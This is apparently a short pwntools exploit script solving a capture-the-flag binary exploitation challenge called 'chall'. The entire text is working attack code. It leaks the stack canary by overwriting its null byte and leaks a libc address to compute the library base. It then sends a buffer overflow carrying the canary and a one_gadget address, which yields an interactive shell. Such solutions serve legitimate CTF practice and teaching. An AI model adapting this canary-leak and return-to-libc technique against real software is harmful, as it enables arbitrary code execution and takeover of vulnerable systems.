from pwn import *

context.arch = "amd64"
elf = ELF("./chall", checksec=False)
libc = elf.libc

proc = elf.process()
proc.recv()

payload = b"A"*25 # Write Canary \x00 no error
proc.send(payload)
canary = proc.recv()[25+8:25+8+7]
canary = u64(b"\x00"+canary)
log.info("Canary: "+hex(canary))
payload = b"B"*0x28
proc.send(payload)
proc.recvuntil(payload)
libc_addr = u64(proc.recv(6)+b"\x00\x00")
libc_base = libc_addr-(libc.sym["__libc_start_main"] + 243)
log.info("libc_base leak : "+ hex(libc_base))
payload = b"A"*0x18 + p64(canary) + p64(0) + p64(libc_base + 0xe6c81)
proc.send(payload)
proc.clean()
proc.interactive()
